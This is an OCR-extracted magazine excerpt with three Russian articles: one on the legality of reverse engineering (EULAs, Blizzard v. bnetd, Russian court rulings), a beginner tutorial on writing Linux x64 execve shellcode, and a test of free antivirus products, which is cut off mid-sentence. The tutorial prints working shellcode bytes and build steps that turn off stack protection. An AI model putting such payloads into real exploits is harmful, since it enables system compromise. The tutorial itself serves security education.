 •  Закон о конфиденциальности электронной связи (статья 2510 раздела
    18 Свода законов США)

  Россия
 •  Гражданский кодекс (часть четвертая)
 •  Федеральный закон «О коммерческой тайне»
 •  Федеральный закон «Об информации, информационных технологиях
    и о защите информации»

  Евросоюз
 •  Директива 2009/24/ЕС о правовой охране компьютерных программ

 Но одними положениями закона дело не ограничивается — помимо норм за-
  кона, есть еще и положения договоров и соглашений, которые заключаются
 между правообладателями софта и его пользователями.
    Производители софта обычно включают пользовательское соглашение
  (EULA), по которому пользователям запрещается производить декомпиляцию,
 дизассемблирование, реверс-инжиниринг и все остальное.
    Вот, например, как выглядит лицензионное соглашение для Kaspersky
 Rescue Disk 10:

       «Запрещается декомпилировать, дизассемблировать, модифициро-
     вать или выполнять производные работы, основанные на ПО, целиком
     или частично за исключением случаев, предусмотренных применимым
     законодательством».

 А вот EULA для продуктов Cisco:

       Customer specifically agrees not to:
                (iii) reverse engineer or decompile, decrypt, disassemble or otherwise
     reduce the Software to human-readable form, except to the extent otherwise
     expressly permitted under applicable law notwithstanding this restriction or
     except to the extent that Cisco is legally required to permit such specific
       activity pursuant to any applicable open source license...

 Такие формулировки часто встречаются в пользовательских соглашениях. Их
 задача — ограничить возможности пользователя там, где закон ему прямо
 не запрещает обратную разработку. Это своего рода юридическая перестра-
 ховка от посягательств на программный код. Нарушение EULA напрямую ведет
  к разным негативным последствиям — начиная от досрочного прекращения
 лицензии и заканчивая денежной компенсацией за нарушение авторских прав.
   Но законодательство и договоры — не самое интересное. Важнее всего
 судебная практика, поскольку она через призму конфликта двух сторон напря-
 мую определяет трактовку норм закона. То есть именно в рамках такой прак-
 тики становится понятно, в каком виде закон понимают и применяют суды
 при вынесении решений. Заодно выясняется и насколько хорошо составлены
 законы и насколько они применимы для разрешения конфликтной ситуации.
   В России дел, связанных с реверсом, почти нет, так что детали пока не успе-
 ли накопиться. Гораздо интереснее изучить прецеденты в США, где примеров
 много. В рамках этой статьи я рассмотрю упомянутый в начале кейс Blizzard.

 BLIZZARD ПРОТИВ BNETD
 Началась эта история еще в 1998 году, когда фирма Blizzard приступила к про-
 дажам игры Starcraft. Спустя несколько месяцев студент Калифорнийского уни-
 верситета в Сан-Диего Марк Бейзингер (Mark Baysinger) занялся реверс-ин-
 жинирингом протокола, по которому игра подключалась к серверу Battle.net.
    Результатом работы стал эмулятор StarHack. И почти сразу же Бейзин-
 гер получил от Blizzard письмо с предупреждением о нарушении прав компа-
 нии и требованием прекратить нарушение. В ответ он поинтересовался, в ка-
  ких именно действиях было выражено нарушение авторских прав компании.
 Не получив ответа на свой вопрос, Бейзингер решил все же прекратить за-
 ниматься развитием проекта, но выложил в интернет исходники под лицензи-
 ей GPL. Так появился опенсорсный проект bnetd — клон Battle.net, который,
 в частности, использовался на сервере bnetd.org.
   В 2002 году в Blizzard начали бета-тестирование следующей игры —
  Warcraft III. А в 2003 году умельцы зареверсили протокол новой игры и написа-
 ли форк bnetd под названием Warforge — с поддержкой Warcraft III.
    Через несколько дней после релиза Warforge компания Internet Gateway,
 предоставлявшая хостинг проекту bnetd, получила аналогичное письменное
 предупреждение (так называемое C&D, cease and desist letter) от Blizzard, со-
 держание которого сводилось к тому, что создатели bnetd нарушали права
  Blizzard. Поскольку после отправки предупреждения проект bnetd не был за-
  крыт, руководство Blizzard приняло решение обратиться в суд.
   В 2002 году адвокаты Blizzard подали иск к хостеру bnetd.org, а также к Тиму
 Джангу (Tim Jung), президенту компании Internet Gateway и одному из разра-
 ботчиков проекта bnetd. Иски получили и системные администраторы доме-
 на bnetd.org, а позднее список ответчиков еще вырос. В иске Blizzard говори-
  лось, что bnetd — серверная программа, которая эмулирует сервис Battle.net,
 но при этом не проверяет подлинность ключа, чтобы определять, легальное ли
 используется клиентское ПО. Помимо этого, разработчиков bnetd обвинили
 в незаконном копировании фрагментов кода компьютерных программ Blizzard.
   В общем, в Blizzard заявили о нарушении ее авторских прав, прав на товар-
 ный знак (в отношении Battle.net), а также о недобросовестной конкуренции
 со стороны ответчиков. В ходе рассмотрения судебных претензий в 2004 году
 суд вынес решение в пользу истца, признав, что ответчики нарушали автор-
 ское право, осуществив реверс-инжиниринг, а также обход систем защиты ав-
 торских прав (то есть не реализовав на своем сервере верификацию ключей
 клиентских программ).
    Ответчики решили обжаловать решение и подали апелляцию. В 2005 году
 Восьмой апелляционный суд поддержал решение суда первой инстанции
 по обеим важным позициям и подтвердил неправомерность реверс-инжини-
 ринга и отсутствия механизма верификации ключей.
    Кейс bnetd оказался значимым для индустрии, поскольку в ту пору онлайно-
 вые сервисы только начинали обретать популярность. Этот судебный процесс
 стал своеобразным руководством для софтверных компаний в подобных во-
 просах и показал весьма низкий уровень толерантности по отношению к таким
 опенсорсным проектам.

 РОССИЙСКИЕ ЗАКОНЫ И СУДЕБНАЯ ПРАКТИКА
 Если говорить о российском законодательстве, то в целом оно допускает про-
 ведение реверс-инжиниринга, о чем идет речь в статье 1280 Гражданского
 кодекса РФ. Эта статья дает понять, что обратная разработка допустима толь-
 ко в случае соблюдения определенных критериев.
    Вот фрагмент текста самой статьи Кодекса.

 Гражданский кодекс Российской Федерации (часть четвертая), ста-
  тья 1280 «Право пользователя программы для ЭВМ и базы данных»

  Лицо, правомерно владеющее экземпляром программы для ЭВМ, вправе
  без согласия правообладателя и без выплаты дополнительного вознагражде-
  ния воспроизвести и преобразовать объектный код в исходный текст (деком-
  пилировать программу для ЭВМ) или поручить иным лицам осуществить эти
  действия, если они необходимы для достижения способности к взаимодей-
  ствию независимо разработанной этим лицом программы для ЭВМ с други-
  ми программами, которые могут взаимодействовать с декомпилируемой про-
  граммой, при соблюдении следующих условий:
     1) информация, необходимая для достижения способности к взаимодей-
       ствию, ранее не была доступна этому лицу из других источников;
     2) указанные действия осуществляются в отношении только тех частей де-
      компилируемой программы для ЭВМ, которые необходимы для достиже-
       ния способности к взаимодействию;
     3) информация, полученная в результате декомпилирования, может ис-
       пользоваться лишь для достижения способности к взаимодействию не-
      зависимо разработанной программы для ЭВМ с другими программами,
      не может передаваться иным лицам, за исключением случаев, когда это
      необходимо для достижения способности к взаимодействию независи-
      мо разработанной программы для ЭВМ с другими программами, а также
      не может использоваться для разработки программы для ЭВМ, по свое-
      му виду существенно схожей с декомпилируемой программой для ЭВМ,
      или для осуществления другого действия, нарушающего исключительное
      право на программу для ЭВМ.


 Как видишь, в законе упомянут только старомодный термин «программа
 для ЭВМ» — Гражданский кодекс не оперирует более узкими понятиями вроде
 мобильных и веб-приложений, протоколов, баз данных и тому подобных вещей.
    Здесь можно выделить три важных момента:
 •  копия программы должна быть получена легальным путем;
 •  целью реверс-инжиниринга должна быть реализация взаимодействия с дру-
    гими программами (то есть нельзя взять и зареверсить продукт конкурента,
    чтобы понять, как в нем реализованы те или иные фичи, а потом аналогич-
   ным образом реализовать их у себя);
 •  информация, необходимая для достижения возможности взаимодействия,
    ранее не была доступна из других источников;

 Теперь рассмотрим наиболее важные вопросы, которые относятся к легаль-
 ности реверс-инжиниринга.

 Можно ли привлекать других лиц для выполнения реверс-ин-
 жиниринга?
 Ответ на этот вопрос может дать следующее решение суда:

 Решение Арбитражного суда города Москвы от 29 мая 2013 года
 по делу № А40-10750/2013

 По смыслу ст. 1274 ГК РФ и п. 2 ст. 1280 ГК РФ исследование программы
  для ЭВМ, как и любого другого объекта исключительных прав, может быть про-
  ведено как пользователем самостоятельно, так и любым иным лицом, обла-
 дающим специальными знаниями, но в интересах пользователя, с его ведо-
 ма и по его согласию. Это объясняется тем, что само по себе исследование
  в силу ст. 1270 ГК РФ не указано в качестве способа использования объекта
  исключительных прав и не предполагает его возмездное отчуждение или иное
  введение в оборот. Кроме того, прямого запрета на осуществление исследо-
  вания в интересах пользователя, с его ведома и по его согласию любым ли-
  цом, обладающим необходимыми специальными познаниями, действующее
  законодательство не содержит.


 То есть можно сделать следующий вывод: исследование программы для ЭВМ
 может быть проведено как пользователем самостоятельно, так и любым иным
 лицом, обладающим специальными знаниями, но в интересах пользователя,
 с его ведома и по его согласию.
    Прямого запрета на такое исследование одним лицом в интересах другого
 в действующем законодательстве нет. Это также вытекает из судебной прак-
  тики, например из следующего документа.


  Постановление Девятого арбитражного апелляционного суда
  от 12 августа 2013 года № 09АП-23848/2013-ГК

  Прямой запрет на осуществление исследования в интересах пользователя,
  с его ведома и по его согласию любым лицом, обладающим необходимыми
  специальными познаниями, в действующем законодательстве отсутствует.



 Допустимо ли проведение реверс-инжиниринга, если в лицен-
 зионном соглашении, на условиях которого распространяется
 программа, ничего об этом не говорится?
 Ответ опять же можно найти в одном из постановлений:


 Постановление Одиннадцатого арбитражного апелляционного суда
  от 25 октября 2012 года по делу № А55-13189/2012

  Заключение лицензионного договора означает, что пользователь програм-
 мы вправе совершать в отношении ее действия, предусмотренные ст. 1280
  ГК РФ, а также иные действия, обусловленные договором и связанные с экс-
  плуатацией программы. Договор действует до продажи или иного отчуждения
  экземпляра программы или базы. На этот договор в отличие от иных лицен-
  зионных соглашений не распространяются правила, установленные пунктами
  2–6 статьи 1235 Кодекса.


 Аналогичный ответ, кстати, содержится и в Постановлении Пленума ВС РФ
 и Пленума ВАС РФ от 26 марта 2009 года № 5, 29 «О некоторых вопросах, воз-
 никших в связи с введением в действие части четвертой Гражданского кодек-
 са Российской Федерации».

 Допустимо ли проводить реверс-инжиниринг, чтобы прове-
 рить, не является ли исследуемая программа объектом нару-
 шения прав?
 Однозначного ответа на этот вопрос нет, и все будет зависеть от обстоя-
 тельств дела. В уже упомянутом примере из практики было признано, что ис-
 следование программы производилось в целях подобной проверки — ответ-
 чик собирал доказательства в свою защиту.

 Постановление Девятого арбитражного апелляционного суда
  от 12 августа 2013 года № 09АП-23848/2013-ГК

 Кроме того, как следует из материалов дела, исследование программы было
  произведено ответчиками в рамках добросовестной и обоснованной необ-
  ходимости, исключительно в целях исполнения обязанности по доказыванию
  исковых требований в соответствии со статьей 65 АПК РФ, не имело цели
  создания для истца каких-либо негативных последствий и не привело к воз-
  никновению таких последствий.


 Но имей в виду, что сейчас судебные решения не являются
 прецедентами в буквальном смысле слова как в США или
 Великобритании. То  есть решение по одной ситуации
 не обязательно станет примером для всех последующих
 схожих дел. Так что и воспринимать их лучше скорее
  как справочную информацию.
                                    WWW
 ВЫВОДЫ                                                                              Русский перевод
 Законодательство (как зарубежное, так и российское) пред-       справочного
 усматривает нормы, по которым допустимо проведение ре-       материала
                                                                             по юридическим верс-инжиниринга. Они содержат ряд условий, которые не-                                                                              аспектам реверс-
 обходимо соблюсти. Это, скорее всего, позволит признать      инжиниринга,
 проведенный реверс-инжиниринг правомерным, даже если     подготовленного
                                                                        фондом правообладатель не дал предварительно своего согласия.
                                                                                                Electronic Frontier
 Российская практика в этом вопросе пока развита плохо,                                                                                          Foundation
 но и ей известны дела, которые так или иначе касались об-
 ратной разработки.
MALWARE
ЛИНУКСОВЫЙ IOT
ПОД ПРИЦЕЛОМ
                                                                          Семён Уваров
                                                                                               @simonuvarovПИШЕМ ШЕЛЛ-КОД ПОД *NIX X64





 IoT — самый настоящий тренд последнего времени. Поч-
 ти везде в нем используется ядро Linux. Однако статей
 по вирусописательству и шелл-кодингу под эту платфор-
 му сравнительно мало. Думаешь, писать шелл-код под
 Linux — только для избранных? Давай выясним, так ли это!

 БАЗА
 Что нужно для работы?
 Для компиляции шелл-кода нам понадобится компилятор и линковщик. Мы
 будем использовать nasm и ld. Для проверки работы шелл-кода мы напи-
 шем небольшую программку на С. Для ее компиляции нам понадобится gcc.
 Для некоторых проверок будет нужен rasm2 (часть фреймворка radare2).
 Для написания вспомогательных функций мы будем использовать Python.

 Что нового в x64?
 x64 является расширением архитектуры IA-32. Основная отличительная ее
 особенность — поддержка 64-битных регистров общего назначения, 64-бит-
 ных арифметических и логических операций над целыми числами и 64-битных
 виртуальных адресов.
    Если говорить более конкретно, то все 32-битные регистры общего назна-
 чения сохраняются, добавляются их расширенные версии (rax, rbx, rcx, rdx,
 rsi, rdi, rbp, rsp) и несколько новых регистров общего назначения (r8, r9,
 r10, r11, r12, r13, r14, r15).
    Появляется новое соглашение о вызовах (в отличие от архитектуры x86,
 оно только одно). Согласно ему, при вызове функции каждый регистр исполь-
 зуется для определенных целей, а именно:
 •  первые четыре целочисленных аргумента функции передаются через реги-
    стры rcx, rdx, r8 и r9 и через регистры xmm0 — xmm3 для типов с плавающей
    точкой;
 •  остальные параметры передаются через стек;
 •  для параметров, передаваемых через регистры, все равно резервируется
    место в стеке;
 •  результат работы функции возвращается через регистр rax для целочис-
    ленных типов или через регистр xmm0 для типов с плавающей точкой;
 •  rbp содержит указатель на базу стека, то есть место (адрес), где начинает-
    ся стек;
 •  rsp содержит указатель на вершину стека, то есть на место (адрес), куда
    будет помещено новое значение;
 •  rsi, rdi используются в syscall.

 Немного о стеке: так как адреса теперь 64-битные, значения в стеке могут
 иметь размер 8 байт.

 Syscall. Что? Как? Зачем?
 Syscall — это способ, посредством которого user-mode взаимодействует
 с ядром в Linux. Он используется для различных задач: операции ввода-выво-
 да, запись и чтение файлов, открытие и закрытие программ, работа с памятью
 и сетью и так далее. Для того чтобы выполнить syscall, необходимо:
 •  загрузить соответствующий номер функции в регистр rax;
 •  загрузить входные параметры в остальные регистры;
 •  вызвать прерывание под номером 0x80 (начиная с версии ядра 2.6 это де-
    лается через вызов syscall).

 В отличие от Windows, где нужно еще найти адрес необходимой функции,
 здесь все довольно просто и лаконично.
   Номера нужных syscall-функций можно найти, например, здесь.

 execve()
 Если мы посмотрим на готовые шелл-коды, то многие из них используют функ-
 цию execve().
    execve() имеет следующий прототип:





 Она вызывает программу filename. Программа filename может быть либо ис-
 полняемым бинарником, либо скриптом, который начинается со строки #!
 interpreter [optional-arg].
    argv[] является указателем на массив, по сути, это тот самый argv[], ко-
 торый мы видим, например, в C или Python.
    envp[] — указатель на массив, описывающий окружение. В нашем случае
 не используется, будет иметь значение null.

 Основные требования к шелл-коду
 Существует такое понятие, как position-independent code. Это код, который
 будет выполняться независимо от того, по какому адресу он загружен. Чтобы
 наш шелл-код мог выполняться в любом месте программы, он должен быть
 позиционно-независимым.
   Чаще всего шелл-код загружается функциями вроде strcpy(). Подобные
 функции используют байты 0x00, 0x0A, 0x0D как разделители (зависит от плат-
 формы и функции). Поэтому лучше такие значения не использовать. В против-
 ном случае функция может скопировать шелл-код не полностью. Рассмотрим
 следующий пример:

 $ rasm2 -a x86 -b 64 'push  0x00'
 6a00

 Как видно, код push 0x00 скомпилируется в следующие байты 6a 00. Если бы
 мы использовали такой код, наш шелл-код бы не сработал. Функция скопиро-
 вала бы все, что находится до байта со значением 0x00.
   В шелл-коде нельзя использовать «захардкоженные» адреса, потому что мы
 заранее эти самые адреса не знаем. По этой причине все строки в шелл-коде
 получаются динамически и хранятся в стеке.
    Вот вроде бы и все.

 JUST DO IT!
 Если ты дочитал до этого места, то уже должна сложиться картина, как будет
 работать наш шелл-код.
   Первым делом необходимо подготовить параметры для функции execve()
 и затем правильно расположить их на стеке. Функция будет выглядеть следую-
 щим образом:



 Второй параметр представляет собой массив argv[]. Первый элемент этого
 массива содержит путь к исполняемому файлу.
    Третий параметр представляет собой информацию об окружении, нам он
 не нужен, поэтому будет иметь значение null.
    Сначала получим нулевой байт. Мы не можем использовать структуру вида
 mov eax,  0x00, поскольку это приведет к появлению null-байтов в коде, так
 что мы будем использовать следующую инструкцию:

 xor rdx, rdx

 Оставим это значение в регистре rdx — оно еще понадобится в качестве сим-
 вола конца строки и значения третьего параметра (которое будет null).
    Так как стек растет от старших адресов к младшим, а функция execve() бу-
 дет читать входные параметры от младших к старшим (то есть стек работает
 с памятью в обратном порядке), то на стек мы будем класть перевернутые зна-
 чения.
    Для того чтобы перевернуть строку и перевести ее в hex, можно использо-
 вать следующую функцию на Python:





 Вызовем эту функцию для /bin/sh:

 >>> rev.rev_str("/bin/sh")
 '68732f6e69622f'

 Получили строку длиной 7 байт. Теперь рассмотрим, что произойдет, если мы
 попробуем положить ее в стек:

 $ rasm2 -a x86 -b 64 'mov rax, 68732f6e69622f; push rax'
 48b82f62696e2f73680050

 Мы получили нулевой байт (второй байт с конца), который сломает наш шелл-
 код. Чтобы этого не произошло, воспользуемся тем, что Linux игнорирует по-
 следовательные слеши (то есть /bin/sh и /bin//sh — это одно и то же).

 >>> rev.rev_str("/bin//sh")
 '68732f2f6e69622f'

 Теперь у нас строка длиной 8 байт. Посмотрим, что будет, если положить ее
 в стек:

 $ rasm2 -a x86 -b 64 'mov rax, 0x68732f2f6e69622f; push rax'
 48b82f62696e2f2f736850

    Никаких нулевых байтов!
    Затем на сайте ищем информацию о функции execve(). Смотрим номер
 функции, который положим в rax, — 59. Смотрим, какие регистры используются:
 •  rdi — хранит адрес строки filename;
 •  rsi — хранит адрес строки argv;
 •  rdx — хранит адрес строки envp.

 Теперь собираем все воедино.
    Кладем в стек символ конца строки (помним, что все делается в обратном
 порядке):

 xor rdx, rdx
 push rdx

 Кладем в стек строку /bin//sh:

 mov rax, 0x68732f2f6e69622f
 push rax

 Получаем адрес строки /bin//sh в стеке и сразу помещаем его в rdi:

 mov rdi, rsp

 В rsi необходимо положить указатель на массив строк. В нашем случае этот
 массив будет содержать только путь до исполняемого файла, поэтому доста-
 точно положить туда адрес, который ссылается на память, где лежит адрес
 строки (на языке С указатель на указатель). Адрес строки у нас уже есть, он
 находится в регистре rdi. Массив argv должен заканчиваться null-байтом, ко-
 торый у нас находится в регистре rdx:

 push rdx
 push rdi
 mov rsi, rsp

 Теперь rsi указывает на адрес в стеке, в котором лежит указатель на строку /
 bin//sh.
    Кладем в rax номер функции execve():

 xor rax, rax
 mov al, 0x3b

 В итоге получили такой файл:





 Компилируем и линкуем под x64. Для этого:

 $ nasm -f elf64 example.asm
 $ ld -m elf_x86_64 -s -o example example.o

 Теперь можем использовать objdump -d example для того, чтобы посмотреть
 получившийся файл:





 Чтобы получить шелл-код вида \x11\x22... из бинарника, можем воспользо-
 ваться следующим кодом:




 В результате получаем:

 \x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\
 xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05


 Тестируем шелл-код
 Для теста используем следующую программу на С (вместо SHELLCODE нужно
 вставить получившийся шелл-код):





 Затем компилируем:

 gcc -m64 -fno-stack-protector -z execstack -o
 shellcode_test shellcode_test.c

 В результате получаем программу shellcode_test. Запу-                                    WWW
 скаем программу и попадаем в интерпретатор sh. Для вы-
 хода вводим exit.                                                      Таблица вызовов
                                                                                                        syscall
 ЗАКЛЮЧЕНИЕ                                                                             Radare2 — фреймворк
 Вот мы и написали свой первый шелл-код под Linux x64.        для реверс-
 На первый взгляд — ничего сложного, труднее всего со-        инжиниринга
 кратить размеры шелл-кода. И нельзя забывать, что это                                                                         Собрание шелл-
 лишь «проба пера», наш шелл-код не справится с DEP                                                                             кодов под различные
 и ASLR, но полученные навыки пригодятся для написания        платформы
 более сложных вещей.
MALWARE
ТЕСТ БЕСПЛАТНЫХ
                      ЧАСТЬ 3АНТИВИРУСОВ
                                 ПРОВЕРЯЕМ БОЕМ
                                   AD-AWARE FREE
                                          ANTIVIRUS+, CRYSTAL
                                        SECURITY, SOPHOS
       84ckf1r3                        HOME И ZONEALARM
   84ckf1r3@gmail.com
                                     FREE ANTIVIRUS +
                                       FIREWALL





ИНТРО
Бесплатных антивирусов в мире оказалось настолько много, что у нас прак-
тически сформировалась целая подрубрика, посвященная их тестированию.
На этот раз в виртуальных боях со зловредами участвует разработка британ-
ских программистов, кошерное комплексное решение от Check Point, быстрый
эстонский антивирь и легендарный мальтийский истребитель рекламы, допол-
ненный антивирусным модулем. Кто из участников покажет лучший результат?
Делайте ставки!

МЕТОДИКА ТЕСТИРОВАНИЯ
Любой эксперимент должен удовлетворять таким крите-
риям, как чистота и воспроизводимость результата. Поэ-
тому и методика осталась с прошлых тестов без измене-
ний. Каждый тестируемый антивирус запускается в своей
виртуальной машине — клонах чистой Windows 10 Pro
                                               WARNING
(32-битная версия 1511, сборка 10586.164) со всеми
последними апдейтами. «Защитник Windows» и фильтр     Все тесты выполнялись
SmartScreen были отключены, а контроль учетных запи-     только в исследователь-
                                                                               ских целях. Необходи-сей — нет.                                                              мые файлы были загру-
   Актуальные угрозы берутся из обновляемой базы     жены с общедоступных
Clean MX. В браузере Edge выполняется переход на за-     ресурсов. Разработчики
                                                                            протестированныхведомо зараженные и фишинговые сайты, список кото-                                                                            антивирусов получили
рых для всех участников теста одинаковый. После ввода                                                                            автоматические уве-
каждого адреса пытаемся загрузить веб-страницу или     домления о результатах
скачать вредоносный файл. Результаты протоколируют-     сканирования. Редакция
                                                                      и автор не несут ответ-
ся, и, если заражения не произошло, начинается новый                                                                              ственности за любой
тест. Иначе готовится новая (чистая) тестовая среда.            возможный вред.

AD-AWARE FREE ANTIVIRUS+
Известное творение мальтийской компании Lavasoft работает практически во
всех версиях Windows (от XP до 10) с разрядностью 32 или 64 бит. Основные
компоненты включают антивирусный сканер, модуль защиты в реальном вре-
мени, веб-фильтр и антишпион. Все загруженные из интернета файлы должны
проверяться автоматически.
   Отличительная особенность Ad-Aware состоит в том, что эту программу
можно сочетать с любым другим антивирусом. Для этого нужно отметить оп-
цию «Установить в качестве второй линии обороны». Тогда из процесса уста-
новки будет исключен модуль защиты в режиме реального времени. Напомню,
что именно конфликты модулей постоянной защиты от разных производителей
вызывают серьезные ошибки: от сбоя при проверке файлов до невозможно-
сти загрузить ОС. Антивирусных сканеров, выполняющих проверку по запросу,
в системе может быть сколько угодно. В своей тестовой виртуалке Ad-Aware
был единственным антивирусом, да и вообще — единственной сторонней про-
граммой (Autoruns и TCPView в сетевой папке не в счет — это портейбл-софт).
   Установка антивируса протекала довольно информативно, однако заняла
много времени. С момента запуска инсталлятора до автоматического начала
первого сканирования прошло 17 минут. Во время каждого этапа установки
показываются десятки восторженных отзывов пользователей. Среди них даже
попадаются утверждения, что Ad-Aware превосходит любой платный антиви-
рус или комплект Internet Security. Ну, по длительности установки ему точно нет
равных. Остальное скоро узнаем.
   Первый тест пройден успешно. Антивирус автоматически определил тро-
ян-дроппер и удалил его из папки «Загрузки» еще до того, как она была открыта.
При этом содержавшая троян веб-страница частично отобразилась в браузере.





                                                            Дроппер удален


Во втором тесте Ad-Aware проигнорировал вредоносный скрипт, и браузер
был перенаправлен на сайт с навязчивой рекламой вечных ценностей.





                                                     HTML:RedirME-inf не распознан


В третьем тесте мы попробовали скачать новый Trojan.Downloader. Это полу-
чилось, но Ad-Aware снова удалил вредоносный файл прежде, чем мы попыта-
лись его запустить.





                                                                Чистая работа!

Самым интересным стал четвертый тест. При попытке запустить только что
скачанный зараженный экзешник (самораспаковывающийся архив RAR) Ad-
Aware среагировал как подслеповатый сторож. Он признал один из распако-
ванных файлов вредоносным и удалил его из временного каталога, но уста-
новка трояна продолжилась.





                                                           Угроза частично удалена

Через несколько секунд система оказалась заражена. В нее установился
псевдоантивирус — его единственной задачей было не дать удалить другие
вредоносные компоненты и adware/crapware, которые загружались в систему
длинной очередью. Установка одних выполнялась в фоне, а других — в полуи-
нтерактивном режиме.





                                                              Установка crapware

Пятый тест прошел подобно четвертому. Ad-Aware вяло ругнулся на примитив-
ного червя, написанного на скриптовом языке AutoIt, позволил ему перехва-
тить контроль и нафаршировать систему всякой дрянью. Примерно через ми-
нуту зловреды прописались на автозапуск.





                                                    Зловреды в автозапуске!

Изменился рабочий стол и браузер. Были установлены десятки левых P2P-со-
единений, а очередь скрытых загрузок в окне TCPView вышла далеко за преде-
лы экрана. Левые активные процессы были видны даже в диспетчере задач.





                                                      Беда не приходит одна


Наиболее заметным для пользователя эффектом стало появление непроше-
ных программ и навязчивой рекламы. По иронии именно с нашествием Adware
программа Ad-Aware и не справилась. Особенно забавно было наблюдать,
как Ad-Aware рапортует об «удалении» очередной угрозы на фоне самопроиз-
вольно открывающихся веб-страниц с рекламой, яоем, хентаем и прочим ази-
атским проном. Да и сам браузер стал выглядеть очень няшно.





                                                                                Ня!

В шестом тесте воспроизводится наиболее типичная ситуация. Чаще всего
пользователи заражаются, скачивая зловреды под видом нужных программ. Са-
мым популярным среди таких наживок остается Adobe Flash Player. Под видом
его мы и подсунули Ad-Aware новый троян. На этот раз антивирус среагировал
так, как и должен был, — удалил вредоносный файл и сообщил об этом. Для га-
рантии мы воспроизвели ситуацию повторно и получили тот же результат.





                                                                  Троян опознан


Седьмой тест оказался провален. Файловый вирус W32.Sality в составе оче-
редного crapware запустился и получил контроль над системой. Внешние из-
менения выражались в автоматической установке тонны левых программ
на китайском, а более глубокие затрагивали настройки системы. Были вклю-
чены потенциально опасные службы, отправка приглашения удаленному по-
мощнику и заблокирован диспетчер задач.





                                                               Слепая защита


Трояны-шифровальщики наносят сейчас самый ощутимый вред. Одна из но-
вых разновидностей такого творения вымогателей была предложена Ad-Aware
в восьмом испытании, причем в виде текстового файла. Мы думали переиме-
новать его при необходимости в EXE, но антивирус распознал его и так.





                                             Текстовый троян — как змея без зубов

Девятый тест Ad-Aware провалил. Система не была заражена только потому,
что Windows 10 не имеет встроенной поддержки архивов RAR. Зараженный
файл успешно скачался и не определялся как вредоносный даже при ручной
проверке.





                                                  Ad-Aware не любит архивы RAR


Заключительный, десятый тест можно считать проваленным частично. Разра-
ботчики заявляли, что Ad-Aware самостоятельно сканирует все загруженные
файлы, однако этого не произошло. Вероятно, он все же проверяет файлы
по маске, игнорируя неизвестные в Windows расширения. Инфицированное
приложение для Android было обнаружено только при ручном сканировании
APK-файла.





                                        Ad-Aware проверяет APK только по запросу


Итог получился скромным: 4 из 10 тестов пройдены
успешно, а остальные провалены полностью или ча-
стично. За несколько минут веб-серфинга Windows
10 была многократно заражена. Конечно, часть угроз
Ad-Aware Free Antivirus+ распознает, но даже их он
не всегда может удалить вовремя и полностью.                                                       INFO
При этом приложение получилось ресурсоемким. По-
сле  установки и обновления баз Ad-Aware  Free      Даже при клонировании
                                                                      систем и едином спискеAntivirus+ занимает 343 Мбайт на диске. Из них 165
                                                                          угроз полной идентичности
Мбайт пришлось на антивирусные базы.                                                                      условий достичь не удается.
   Отдельный минус хочется поставить за исполь-         Тесты проводятся
зование навязчивой рекламы в средстве для борьбы         последовательно
                                                                        в течение суток — все-такис ней. В бесплатных программах часто предлагаются                                                                   выполнение сорока тестов
тулбары, «оптимизаторы» и прочее crapware, одна-      и их описание занимает
ко Lavasoft превзошли в этом остальных разработчи-     не один час. Поэтому даже
                                                                  при синхронизации времеников. Компонент веб-фильтрации может быть установ-                                                                     обновления антивирусных
лен только вместе с опциями от Yahoo! Отказаться                                                                       баз последний антивирус
от них можно, только если не ставить Ad-Aware Web        получает некоторое
Companion.                                                       преимущество перед
                                                                     первым. Просто потому,
   Конечно, можно сначала согласиться и сделать                                                                             что его служба облачной
рекламируемый поисковик основным в IE11 и Firefox.        проверки успевает
Пусть он отображается на стартовой странице и всех       научиться распознавать
                                                                              те угрозы, которые быливкладках до первого изменения настроек. Нам-то                                                                     неизвестны еще несколько
все равно, поскольку все тесты проводятся в Edge.        минут назад. Будем
Удивляет и другое: веб-фильтр работает отдельно      считать это погрешностью
                                                                   и постараемся ее учесть,от компонента «Веб-защита», который доступен толь-
                                                                         анализируя характер
ко в платных версиях. Они будут предлагаться каждый                                                                       срабатывания каждого
раз, когда в настройках нажимаешь «Установить» на-            антивируса.
против любого неактивного компонента.





                                                    Лечение при перезагрузке

Немного скрашивает унылое впечатление от испытаний антивируса Ad-Aware
то, что он умеет выполнять отложенное лечение при перезагрузке. Иногда это
позволяет взять реванш в том случае, если вредоносный код все же получил
контроль над системой. Впрочем, даже в четвертом тесте эффект был на уров-
не плацебо. Все удаленные Ad-Aware компоненты вскоре загружались вновь.

CRYSTAL SECURITY
Эстонский программист Кардо Кристал (Kardo Kristal) предлагает свой антиви-
рус Crystal Security как обычное или портейбл-приложение для Windows (2003
Server — 10 любой разрядности). Устанавливается он практически мгновен-
но, а свободное место на диске уменьшается всего на полтора мегабайта.
По сути, на компьютер инсталлируется только клиентское приложение, выпол-
няющее облачную проверку.
  В настройках по умолчанию облачный антивирус ведет себя немного па-
раноидально. Вскоре после первого запуска он начал ругаться на системные
компоненты в заведомо чистой Windows 10 Pro. Поэтому мы решили выполнить
перед началом тестов проверку и добавить системные файлы в белый список,
чтобы не путать истинные и ложноположительные результаты срабатывания.





                               Ложноположительное срабатывание Crystal Security


Радует, что у Crystal Security есть множество настроек, задающих типы прове-
рок, пороги срабатывания и действия при обнаружении небезопасных объек-
тов. Для чистоты эксперимента мы оставили все значения такими, какими они
были изначально.
   Тест 1. Действия Trojan-Dropper на странице азиатского порносайта были
приостановлены Crystal Security, но при этом содержимое веб-страницы ото-
бразилось. К сожалению или к счастью — решать тебе. Большинство других ан-
тивирусов в подобных случаях блокируют загрузку страницы целиком, поскольку
беда редко приходит одна. Помимо дроппера, в HTML-код могут быть внедрены
вредоносные скрипты и другая зараза, которую не всегда удается вовремя рас-
познать. Важно, что Crystal Security не определил тип угрозы. Он просто сооб-
щил о том, что репутация файла неизвестна и лучше его не запускать.





                                                      П — прон


                           Продолжение статьи
MALWARE
ТЕСТНачало статьи БЕСПЛАТНЫХ
                      ЧАСТЬ 3АНТИВИРУСОВ
ПРОВЕРЯЕМ БОЕМ CLAM SENTINEL,
FORTICLIENT, TENCENT И NANO АНТИВИРУС



   Тест 2. Фишинговая страница загрузилась беспрепятственно со все-
ми скриптами. Нас долго уговаривали выиграть Mercedes, Audi или BMW. Мы
даже заполнили анкеты на других сайтах, которые открывались после каждого
нового клика «хочу!». Crystal Security игнорировал нашу алчность, но автомо-
биль так и не прислали. Наверное, его задержали на таможне вместе с тонной
